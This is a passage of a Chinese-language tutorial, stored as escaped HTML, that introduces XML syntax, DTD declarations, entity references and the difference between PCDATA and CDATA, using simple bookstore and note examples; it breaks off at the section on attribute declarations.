&lt;blockquote&gt;
&lt;p&gt;XML 被设计用来传输和存储数据，其焦点是数据的内容。&lt;br&gt;
HTML 被设计用来显示数据，其焦点是数据的外观。&lt;br&gt;
&lt;strong&gt;HTML 旨在显示信息，而 XML 旨在传输信息。&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;基本格式-语法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#基本格式-语法&#34;&gt;#&lt;/a&gt; 基本格式、语法&lt;/h3&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?xml version=&lt;span class=&#34;string&#34;&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt; encoding=&lt;span class=&#34;string&#34;&gt;&amp;quot;UTF-8&amp;quot;&lt;/span&gt; standalone=&lt;span class=&#34;string&#34;&gt;&amp;quot;yes&amp;quot;&lt;/span&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;&amp;lt;!--xml文件的声明--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;bookstore&lt;/span&gt;&amp;gt;&lt;/span&gt;                                                 &lt;span class=&#34;comment&#34;&gt;&amp;lt;!--根元素--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;book&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;category&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;COOKING&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;        &lt;span class=&#34;comment&#34;&gt;&amp;lt;!--bookstore的子元素，category为属性--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;Everyday Italian&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;           &lt;span class=&#34;comment&#34;&gt;&amp;lt;!--book的子元素，lang为属性--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;author&lt;/span&gt;&amp;gt;&lt;/span&gt;Giada De Laurentiis&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;author&lt;/span&gt;&amp;gt;&lt;/span&gt;                  &lt;span class=&#34;comment&#34;&gt;&amp;lt;!--book的子元素--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;year&lt;/span&gt;&amp;gt;&lt;/span&gt;2005&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;year&lt;/span&gt;&amp;gt;&lt;/span&gt;                                     &lt;span class=&#34;comment&#34;&gt;&amp;lt;!--book的子元素--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;price&lt;/span&gt;&amp;gt;&lt;/span&gt;30.00&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;price&lt;/span&gt;&amp;gt;&lt;/span&gt;                                  &lt;span class=&#34;comment&#34;&gt;&amp;lt;!--book的子元素--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;book&lt;/span&gt;&amp;gt;&lt;/span&gt;                                                 &lt;span class=&#34;comment&#34;&gt;&amp;lt;!--book的结束--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;bookstore&lt;/span&gt;&amp;gt;&lt;/span&gt;                                       &lt;span class=&#34;comment&#34;&gt;&amp;lt;!--bookstore的结束--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot; standalone=&amp;quot;yes&amp;quot;?&amp;gt;&lt;/code&gt;  称为 XML prolog ，用于声明 XML 文档的版本和编码，是可选的，必须放在文档开头。&lt;br&gt;
standalone 值是 yes 的时候表示 DTD 仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是 no，而且有些 parser 会直接忽略这一项。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;基本语法：&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;所有 XML 元素都须有关闭标签。&lt;/li&gt;
&lt;li&gt;XML 标签对大小写敏感。&lt;/li&gt;
&lt;li&gt;XML 必须正确地嵌套。&lt;/li&gt;
&lt;li&gt;XML 文档必须有根元素。&lt;/li&gt;
&lt;li&gt;XML 的属性值须加引号。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;dtd&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dtd&#34;&gt;#&lt;/a&gt; DTD&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;DTD 基本概念&lt;/strong&gt;&lt;br&gt;
 XML 文档有自己的一个格式规范，这个格式规范是由一个叫做  &lt;code&gt;DTD（document type definition）&lt;/code&gt;  的东西控制的。&lt;br&gt;
DTD 用来为 XML 文档定义语义约束。可以嵌入在 XML 文档中 (内部声明)，也可以独立的放在另外一个单独的文件中 (外部引用)。是 XML 文档中的几条语句，用来&lt;strong&gt;说明哪些元素 / 属性是合法的以及元素间应当怎样嵌套 / 结合&lt;/strong&gt;，也用来将一些特殊字符和可复用代码段自定义为实体。&lt;br&gt;
&lt;strong&gt;实体引用&lt;/strong&gt;&lt;br&gt;
 XML 元素以形如  &lt;code&gt;&amp;lt;tag&amp;gt;foo&amp;lt;/tag&amp;gt;&lt;/code&gt;  的标签开始和结束，如果元素内部出现如 &lt;code&gt;&amp;lt;&lt;/code&gt;  的特殊字符，解析就会失败，为了避免这种情况，XML 用实体引用（entity reference）替换特殊字符。XML 预定义五个实体引用，即用 &lt;code&gt;&amp;amp;lt;&amp;amp;gt;&amp;amp;amp;&amp;amp;apos;&amp;amp;quot&lt;/code&gt;  替换  &lt;code&gt;&amp;lt; &amp;gt; &amp;amp; &#39; &amp;quot;&lt;/code&gt;  。&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://fc04db.oss-cn-hangzhou.aliyuncs.com/image/202405291625057.png&#34; alt=&#34;image-20240529162528891&#34;&gt;&lt;/p&gt;
&lt;p&gt;实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为  &lt;code&gt;Document Type Defination（DTD&lt;/code&gt; ，文档类型定义）的过程中进行。&lt;br&gt;
&lt;strong&gt;dtd 的引入方式&lt;/strong&gt;&lt;br&gt;
 DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。&lt;br&gt;
&lt;em&gt;内部 DTD&lt;/em&gt;&lt;br&gt;
 使用内部的 dtd 文件，即将约束规则定义在 xml 文档中&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE 根元素名称 [元素声明]&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;示例代码：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?xml version=&lt;span class=&#34;string&#34;&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;keyword&#34;&gt;note&lt;/span&gt; [&amp;lt;!--定义此文档是 note 类型的文档--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ELEMENT &lt;span class=&#34;keyword&#34;&gt;note&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;to&lt;/span&gt;,&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt;,&lt;span class=&#34;keyword&#34;&gt;heading&lt;/span&gt;,&lt;span class=&#34;keyword&#34;&gt;body&lt;/span&gt;)&amp;gt;&lt;/span&gt;&amp;lt;!--定义note元素有四个元素--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ELEMENT &lt;span class=&#34;keyword&#34;&gt;to&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;#PCDATA&lt;/span&gt;)&amp;gt;&lt;/span&gt;&amp;lt;!--定义to元素为”#PCDATA”类型--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ELEMENT &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;#PCDATA&lt;/span&gt;)&amp;gt;&lt;/span&gt;&amp;lt;!--定义from元素为”#PCDATA”类型--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ELEMENT &lt;span class=&#34;keyword&#34;&gt;head&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;#PCDATA&lt;/span&gt;)&amp;gt;&lt;/span&gt;&amp;lt;!--定义head元素为”#PCDATA”类型--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ELEMENT &lt;span class=&#34;keyword&#34;&gt;body&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;#PCDATA&lt;/span&gt;)&amp;gt;&lt;/span&gt;&amp;lt;!--定义body元素为”#PCDATA”类型--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;note&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;to&lt;/span&gt;&amp;gt;&lt;/span&gt;Y0u&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;to&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;from&lt;/span&gt;&amp;gt;&lt;/span&gt;@re&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;from&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;v3ry&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;g00d!&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;note&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;em&gt;外部 DTD&lt;/em&gt;&lt;br&gt;
（1）引入外部的 dtd 文件&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE 根元素名称 &lt;span class=&#34;keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;dtd路径&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;（2）使用外部的 dtd 文件 (网络上的 dtd 文件)&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE 根元素 &lt;span class=&#34;keyword&#34;&gt;PUBLIC&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;DTD名称&amp;quot;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;DTD文档的URL&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;当使用外部 DTD 时，通过如下语法引入：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;keyword&#34;&gt;root-element&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;filename&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;示例代码：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?xml version=&lt;span class=&#34;string&#34;&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt; encoding=&lt;span class=&#34;string&#34;&gt;&amp;quot;UTF-8&amp;quot;&lt;/span&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;keyword&#34;&gt;root-element&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;test.dtd&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;note&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;to&lt;/span&gt;&amp;gt;&lt;/span&gt;Y0u&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;to&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;from&lt;/span&gt;&amp;gt;&lt;/span&gt;@re&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;from&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;v3ry&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;g00d!&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;note&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;test.dtd&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ELEMENT &lt;span class=&#34;keyword&#34;&gt;to&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;#PCDATA&lt;/span&gt;)&amp;gt;&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;&amp;lt;!--定义to元素为”#PCDATA”类型--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ELEMENT &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;#PCDATA&lt;/span&gt;)&amp;gt;&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;&amp;lt;!--定义from元素为”#PCDATA”类型--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ELEMENT &lt;span class=&#34;keyword&#34;&gt;head&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;#PCDATA&lt;/span&gt;)&amp;gt;&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;&amp;lt;!--定义head元素为”#PCDATA”类型--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ELEMENT &lt;span class=&#34;keyword&#34;&gt;body&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;#PCDATA&lt;/span&gt;)&amp;gt;&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;&amp;lt;!--定义body元素为”#PCDATA”类型--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;PCDATA&lt;/strong&gt;&lt;br&gt;
PCDATA 的意思是被解析的字符数据。PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。&lt;br&gt;
&lt;strong&gt;CDATA&lt;/strong&gt;&lt;br&gt;
CDATA 意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;元素&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ELEMENT element-name category&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;或&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ELEMENT element-name (element-content)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ELEMENT 家庭(人+,家电*)&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;这个 DTD 规定了家庭元素中可以有 1 到多个” 人” 这个子元素，也可以有 0 到多个” 家电” 这个子元素。其中的加号”+” 和星号”*” 的含义与正则表达式中的含义一致。&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://fc04db.oss-cn-hangzhou.aliyuncs.com/image/202405291637640.png&#34; alt=&#34;image-20240529163707592&#34;&gt;&lt;/p&gt;
&lt;p&gt;类似于正则表达式&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;属性&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;属性声明语法&lt;/strong&gt;：&lt;/p&gt;
